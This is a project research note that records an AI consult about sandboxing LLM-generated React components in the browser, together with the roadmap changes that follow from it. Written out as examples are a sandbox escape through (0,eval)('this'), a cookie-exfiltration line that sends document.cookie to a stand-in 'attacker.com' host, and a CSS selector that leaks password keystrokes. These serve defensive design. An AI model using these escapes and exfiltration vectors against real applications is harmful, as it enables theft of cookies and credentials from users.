# External Consult — Browser Execution/Isolation of LLM-Generated React

**Source:** Google AI Mode (browser-automation consult), 2026-06-24
**Question asked (open/unbiased):** "I'm building a browser-only web app that compiles and runs LLM-generated React components at runtime. What are all the viable ways to execute and isolate this untrusted generated component code safely in the browser, and the tradeoffs? I'm considering `new Function()` with a restricted scope vs iframe sandbox. What options or risks am I missing?"

> AI can make mistakes — claims below are a second opinion to weigh, not gospel. Where they conflict with our verified `.planning/research/STACK.md`/`PITFALLS.md`, prefer the verified docs.

## Isolation spectrum (most → least isolated)

1. **Isolated `<iframe>` sandbox (recommended industry standard — CodeSandbox/StackBlitz).** `<iframe sandbox="allow-scripts" src="...different-origin...">`.
   - **Critical trap:** do NOT combine `allow-scripts` + `allow-same-origin` on the same origin — the iframe can programmatically remove its own sandbox.
   - **Best practice:** serve untrusted content from a *completely different domain* (e.g. app on `myapp.com`, generated code from `myapp-usercontent.com`).
   - Pros: process-level isolation, blocks host-DOM access. Cons: `postMessage` overhead, higher memory per component.
2. **Web Workers (logic only).** Separate OS thread, no DOM/`window`/`document`. Trap: React needs a DOM, can't render JSX in a worker; workaround is `worker-dom` syncing to the main thread. Pros: full host-DOM isolation, no main-thread block. Cons: very complex; most React libs break. **Uniquely:** a Worker with a `terminate()` timeout is the only way to hard-stop runaway infinite loops.
3. **ShadowRealm API (emerging).** Distinct global scope, synchronous. Cons: limited browser support; only primitives cross the boundary (cannot pass React elements/complex state).
4. **`new Function()` + Proxy (our v1 choice).** Weakest. Escapes via constructor inheritance exist; shares host DOM.

## `new Function()` + Proxy vs `<iframe>` (cross-origin + sandbox)

| Feature | `new Function()` + Proxy | `<iframe>` (cross-origin sandbox) |
|---|---|---|
| Security | 🛑 Weak — constructor-inheritance escapes | 🟢 Strong — browser process security |
| DOM access | Shares host DOM (can steal cookies/tokens) | Blocked from host DOM |
| Performance | Fast init, local memory | Slower load, message passing |
| React state | Simple prop/state sharing | Complex — serialize via `postMessage` |

## Critical missing risks (vs. our current requirements)

1. **Infinite-loop DoS.** LLM code frequently emits `while(true)` or infinite `useEffect` update loops. Under main-thread `new Function()` this **freezes the entire app**. Iframes minimize; only a Web Worker with `worker.terminate()` timeout hard-stops it. → Our SEC/RESIL set does not currently address this. Mitigation options for v1: a render/exec watchdog, and treating it as a known limitation until the iframe/worker upgrade (HARD-01).
2. **Indirect global-scope escape.** Even with a `window`-blocking Proxy, untrusted code can reach the true global via `(function(){return this})()` or `(0,eval)('this')`, then `location.href = "attacker.com" + document.cookie`. → Our `new Function()` denylist + static-reject pass (SEC-01, SEC-03) must explicitly cover `eval`, `Function`/`constructor.constructor`, and `(0,eval)('this')`-style vectors, and the CSP (`connect-src 'self' https://api.anthropic.com`) is the backstop against exfiltration egress.
3. **CSS keystroke exfiltration.** Raw generated CSS like `input[type="password"][value^="a"]{background:url(...)}` can exfiltrate keystrokes / break host layout. → Encapsulate generated styles in a **Shadow DOM** boundary (and, in the v2 iframe, inside the frame).

## Implications for our roadmap

- **Phase 2 (SEC-01..03):** strengthen the `new Function()` denylist + static-reject to cover indirect global escapes (`eval`, `Function`, `.constructor.constructor`, `(0,eval)('this')`). Keep the mount step a single swappable seam (already planned) so the iframe upgrade is one module.
- **Phase 2/4 (rendering):** consider Shadow-DOM style encapsulation for generated apps/widgets to prevent CSS bleed/exfiltration and keep host theming clean.
- **Resilience (Phase 6/7):** add an infinite-loop/runaway watchdog consideration (render-time budget; or document as a known v1 limitation pending the worker/iframe upgrade).
- **v2 (HARD-01 iframe sandbox):** serve generated code from a **different origin**, never `allow-same-origin` + `allow-scripts` together, Shadow-DOM-encapsulate styles, `postMessage` bridge. This is the production end-state.
- CSP `connect-src 'self' https://api.anthropic.com` (already in Phase 1) is the critical egress backstop that limits the damage of any escape.

**Sources cited by AI Mode (secondary):** WebContainers (monogram.io), almostnode (Medium), JS execution-context security (itnext.io). Treat as leads, not authorities.
